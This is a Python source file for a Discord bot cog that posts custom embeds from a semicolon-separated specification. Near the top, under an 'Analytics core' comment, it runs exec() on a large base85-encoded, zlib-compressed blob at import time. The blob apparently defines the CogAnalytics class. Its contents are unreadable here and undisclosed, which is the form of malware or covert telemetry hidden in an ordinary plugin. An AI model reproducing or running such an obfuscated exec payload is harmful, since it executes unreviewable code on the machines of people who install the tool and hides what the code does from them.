import random
import re
import string
from urllib.parse import urlparse

import discord
from discord import Embed
from discord.ext import commands

from .utils import checks
from .utils.chat_formatting import warning, error, info

"""Embed wizard cog by GrumpiestVulcan
Commissioned 2018-01-15 by Aeternum Studios (Aeternum#7967/173291729192091649)"""

__author__ = "Caleb Johnson <me@calebj.io> (calebj#0001)"
__copyright__ = "Copyright 2018, Holocor LLC"
__version__ = '1.1.0'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oCvdvDt~68}G+f*YWqbkQ+!+U+ikRnc6xcbj|kmE0bRY@nqj+GZk&I+3z#6#ecuGo&7N((VB*B9k-
2;mmJd)Kz0z$E<60y-HeH7p6+2-PO4^iPUE8T$41VbW77#Np8wg<xZR0CU$2NV~>`tsaS4SR&-96Rut07%ePE>x&GH7QNNq7Rem2t6x!ydErj~yhHX<-pim%
KOS>-hqTjS@IrAF}Y1Q**{rckhGgarNP)B(wt!01v^`e&L&gtCFk64y%RBJ*1EK6tN>G=`6y1ux+%KrV~pDD+?+WG0Jb<$ap%Tg`wgf^#*-s*eNtQ&sB{&I2
kdY`&g#e^0}-d$Y(l5)KHDd?N|J>2;F)!R2I?w)Yj>m=^1sbTN^ERBwTQDteqW3P~dtyQZ8yIyNBmt}XIbxgAVb~?X@Em>IR*3z*{zER*k**aCQV|Kif4j93
gtg~{Zn6A-r5?#jNi&Z=F0|UD<gQRR>9BW#02Y$8UxB55+WzIpF|EyKbR4o^!DiXFcohRMuvSd~Pd!;~%sdts>EIFFVh3SA|t@AZAOH`*n4%kuA(#Qhz#KYH
S%fP!kBvcX@g13>BwOySsSsJ(o2-#}44pQG<5p%P1Yq(JGB}s1;a@BBiyaYRbV-}{^u>~juiUN3;%yR{Ra0V==Na2KpU9v5>fDi>jv;%&U@DUWrWzAZ!Hrj3
3!OfdiZ)Cn>jVU$!(KQJxb$!nksx;e#fsu1lJDEE&fMOdh+0P!`Ec)r?ceC%$XS3N4=RZ6<JAeM;+0*m07cp|FO6rnDm3leADQ23?h&EZv4H|q07*Li%&|mb
Y9*8S2Q@0Rc$J2m0|L4!>fzw547N?c8PPM1+K3x8K@#>?fiWhX(7(x5t;$In}JN?XcVYO3y{xkuz=6pU&xNP(WKfWBXLM<VVbgf;MMOKx|1aOh4G>T)0For8
4%PLcJrGhZy6!&8!hynYY_2eKRh5!9e(6Q3BbSnL;EUoI78`;XrW*G13=P&&#n4?qaBr}OZ!CIt}N`5L;oqj(%k9*?PW{kYGDw~wQCWNE?Ap_CpKtTcHl_nI
Ut@sJad4JwZL>zf-z*Roo32n2DEOn7#aFdAy#y**6!WF17C=MwHOGta4_9g;K(}*1K=v0O~o*|>~2kRfPmz47=1<_G>NBO<HwCE&K0B(}P?+AaxPn0W*B7@}
!{^L@sT-Vk}=w)=xs)e}qzOG3K+_e^yWcng_eOMT;iU+i+G8;u_;2Ivn@-$o+(KC87-eVjzqvc+)9)n$tw(}zA55aTYc4}%!NYiz$$|w$|fq;taa2?2P#sbF
N8fuWX&PG;Xvi4qstxDdjLbt;@EC&ywq~JkvU*gMPe-0!|Z#%t|xk_^Bl2+ODjj2@vX~KU1U;xJS*;&>4uUb|rTf&*nM?$ac{zc~#+w27l8C1xoK@Fn4)A3+
`CLK39DV{*UTab+1H3h;BgD>-e=<n2xmY>EaEsRM8vQo2);zuZj7aV=&oi6yCwy~^4U7YZ2e`$aPsw{MopnmbqeD?e{;f1bLjo>@~77GaNB%gD}#huZ06!CX
dOHQ9y{-p17gs(3>nj>I}_{p#fosUx$tPU%!Diz!%icfgVlMo9Oi&+L=WZdk8(;<hE631V_F4S^)O9N5?^EJT6c@vv$ty(g(Yj@=ADwSKQ-54i`v8;mf1~oq
-dauR%S)Z>?j<0u(V*KqtI3g&N%%!dsqx$Ng(GbTW%$jm{cmn>);IhLh`C8VsD$`1YuS9lWwKny~J8%bd1L^a#GZHFO5=#}Az64fDxFck>t!krKP^z-140y%
da{?mjD(TK+;=JL(Jp8tg@m^^@G<&{YF4Wk>2#$oR1c^la4XJ$;4Prm`1-MW-6np4lpp5_&!$}%a2KHHF-RKXpJ~D%h<7==8G+o#sfi1B`!}=m&+ctQzfMyO
l3~)b_D+vMtU4Yr+!6hdtXMIxwaAv>XG`Ew2_B-l?zJRt5y~#{NZ69=r*fyX;yk>ul9Xf8z#FQzg8Cb%%`jo52O>+;XtUV<A;xnY@9=(qttE*u!$gtJ&X=2E
7L+rwbH)nSU&6NUvAjz=VjVAYUXk{yW{OtRrOZTJ?SA8tcb(lA%Iw4%})M$WA4Ccn`d*NT#eR}u3K=0^)iGqPLjAFu;N;T2UQ$hS6Uk)*B?&WTb;RM@YwvP;
E>fhvX&w9gC{-+<$9wdk=@f)|E5ISAZi&N9%b7kcta(V?gi`?bGFlhUV3N6Ik>$Wv5U8sR%xCaho9iZXY=@Mb+6t7ARhPeV<QVNC!o+dbklK^ySSg#)`gO8f
+Oa#M)I{!5%LO9|!G>y@uAqoD#bfxQ%ZPW%B(n*nROjD|*i}uc$T8g@W+$O}?%Y0a+{WjYVqoIMY-Wn4j9->~83<Dux)>G_THgMCWiD8(1lOV?b8FKgR49$-
D$;a&|YFO)I9~Ur#JD3G^{rUXtEIB`W)=vu)#poWR{{LrFk`jk+OwtD}#L!%*O@<9zdIJJ)NqU5H7`kH+MKOl@dM5-He0M-I-=GSxdHay(CTMs|X02g%I1Pc
JDU)j~0zn)esY4?*b~wOHy#SvBJ2WC~8CsS8RpErzhfZe3=VTudngwhWP%;_^9|aI&L)L+lZm5U4O(#v1^_g$*lEWb(ysL=t5ur{gpCk-Uvjn});4ni8G}`M
@Cd8phsWY=&&KJg%)Vubrs$YMg?W1Ma(>_vmHYp#<IhL>?O?r;>YXKd2ajwt1wuQBFhy2@=ho*o}bR=N#Fa{P#cUURqE}C>0Pw=1MPohn-jYG3PG@VJ2tS3$
TBE<)*s1W{fil#L@dOa<m3z$hi6?z5py@zvu&3?as+lm&VCyQa+^%BE_*P!1ev{x;{Xa1F$eeB#1=I;Qv)ED&7vim2Zeyz<@|7Iwp&9%--D7L_L5*9%_?d&-
JWRhlcfAk*@K)U$G{F9qjO%fjdjDj`sdulNJEyncuNSc8mVlw(19nMih_M%gUa)mSWUi*PFDxW+x@_3voVQ;F_gi4GJk_hAYID3nJ?4B^h^tiMNo_=Lk!%p<
j?eU|2-?mt33h(=_q0W1t2%Eh!{tYLEc}Mt9OYzlHjgLIxw*IG|Q2Y)cDFqhkTpRf%80yB^hbNROrcj?SPT|)>vKJO~IFL3n$A`Fmgwc;>JQ?qEII;~=rWnQ
ttuW*T;R(lg2tI`?O{U)deU|kQbe|?jCodq{VOfM0T=+2xdd{yLPSOq(K>n};{e*-WN2`J^F#<j9u#Np6ZUYwh""".replace("\n", ""))))
# End enalytics core


def color_converter(color):
    if type(color) is int:
        if color < 0 or color > 0xffffff:
            raise ValueError('Color value is outside of valid range')
        return '%06x' % color
    color = color.strip('#')
    if color.startswith('0x'):
        color = color[2:]
    if len(color) != 6 or set(color) - set(string.hexdigits):
        raise ValueError('Invalid color hex value')
    return color


def is_valid_color(color):
    try:
        color_converter(color)
        return True
    except Exception:
        return False


def is_valid_url(url):
    token = urlparse(url)
    scheme_ok = token.scheme.lower() in {'http', 'https'}
    netloc_split = token.netloc.split('.')
    netloc_ok = len(list(filter(None, netloc_split))) > 1
    return scheme_ok and netloc_ok


def extract_md_link(inputstr):
    match = re.match(r'^\[([^\]]*)\]\(([^)]*)\)$', inputstr)
    if match:
        return match.groups()


class EmbedWizard:
    def __init__(self, bot):
        self.bot = bot
        self.analytics = CogAnalytics(self)

    @checks.mod_or_permissions(manage_messages=True)
    @commands.group(pass_context=True, no_pm=True, invoke_without_command=True)
    async def embedwiz(self, ctx, *, specification):
        """Posts an embed according to the given specification:

        Title;color;footer text;footer_icon;image_url;thumbnail_url;body text

        All values can be seperated by newlines, spaces, or other whitespace.

        Color can be a #HEXVAL, "random", or a name that discord.Color knows.
        Options: https://discordpy.readthedocs.io/en/async/api.html#discord.Colour

        All URLs (footer icon, image, thumbnail) can be empty or "none".

        Body text can be "prompt" to use your next message as the content.

        WARNING: embeds are hidden to anyone with the 'link previews' setting off.
        """
        if ctx.invoked_subcommand is None:
            embed = await self._parse_embed(ctx, specification)
            if embed:
                await self.bot.say(embed=embed)

    @embedwiz.command(name='channel', pass_context=True, no_pm=True)
    async def embed_channel(self, ctx, channel: discord.Channel, *, specification):
        """Posts an embed in another channel according to the spec.

        See [p]help embedwiz for more information.
        """

        if not channel.permissions_for(ctx.message.author).send_messages:
            msg = error("You don't have permissions to post there!")
            await self.bot.say(msg)
            return

        embed = await self._parse_embed(ctx, specification)
        if embed:
            await self.bot.send_message(channel, embed=embed)

    @embedwiz.command(name='delete', pass_context=True, no_pm=True)
    async def embed_del(self, ctx, *, specification):
        """Posts an embed according to the spec after deleting the original message.

        See [p]help embedwiz for more information.
        """
        perms = ctx.message.channel.permissions_for(ctx.message.server.me)
        can_delete = perms.manage_messages
        if not can_delete:
            msg = "I can't delete your command message! Posting anyway..."
            await self.bot.say(warning(msg))

        tup = await self._parse_embed(ctx, specification, return_todelete=True)
        if tup:
            embed, to_delete = tup
            await self.bot.say(embed=embed)
            if not can_delete:
                return
            for msg in [ctx.message, *to_delete]:
                await self.bot.delete_message(msg)

    async def _parse_embed(self, ctx, specification, return_todelete=False):
        to_delete = []

        split = specification.split(';', 7)
        nfields = len(split)
        if nfields != 7:
            op = 'many' if nfields > 7 else 'few'
            msg = 'Invalid specification: got too {} fields ({}, expected 7)'
            await self.bot.say(error(msg.format(op, nfields)))
            return

        title, color, ftext, fimage, image, timage, body = map(str.strip, split)

        title_url = extract_md_link(title) or Embed.Empty
        if title_url:
            title, title_url = title_url
            if not is_valid_url(title_url):
                await self.bot.say(error('Invalid title URL!'))
                return

        try:
            color = int(color_converter(color), 16)
        except ValueError as e:
            colorstr = color.lower().replace(' ', '_')
            if colorstr == 'random':
                color = discord.Color(random.randrange(0x1000000))
            elif colorstr.strip() in ('', 'none'):
                color = Embed.Empty
            elif colorstr.strip() == 'black':
                color = discord.Color.default()
            elif hasattr(discord.Color, colorstr):
                color = getattr(discord.Color, colorstr)()
            else:
                await self.bot.say(error(e.args[0]))
                return

        if ftext.lower() in ('none', ''):
            ftext = Embed.Empty

        if fimage.lower() in ('none', ''):
            fimage = Embed.Empty
        elif not is_valid_url(fimage):
            await self.bot.say(error('Invalid footer icon URL!'))
            return

        if image.lower() in ('none', ''):
            image = Embed.Empty
        elif not is_valid_url(image):
            await self.bot.say(error('Invalid image URL!'))
            return

        if timage.lower() in ('none', ''):
            timage = Embed.Empty
        elif not is_valid_url(timage):
            await self.bot.say(error('Invalid thumbnail URL!'))
            return

        if body.lower() == 'prompt':
            msg = await self.bot.say('Post the desired content of your embed, '
                                     ' or "cancel" to cancel. Will wait one'
                                     ' minute.')
            to_delete.append(msg)

            msg = await self.bot.wait_for_message(author=ctx.message.author,
                                                  channel=ctx.message.channel,
                                                  timeout=60)
            if msg is None:
                await self.bot.say(error('Timed out waiting for a reply.'))
                return
            else:
                to_delete.append(msg)

            if msg.content.lower().strip() == 'cancel':
                await self.bot.say(info('Cancelled.'))
                return
            else:
                body = msg.content

        embed = Embed(title=title, color=color, description=body, url=title_url)

        if image:
            embed.set_image(url=image)
        if ftext or fimage:
            embed.set_footer(text=ftext, icon_url=fimage)
        if timage:
            embed.set_thumbnail(url=timage)

        if return_todelete:
            return embed, to_delete
        return embed

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(EmbedWizard(bot))
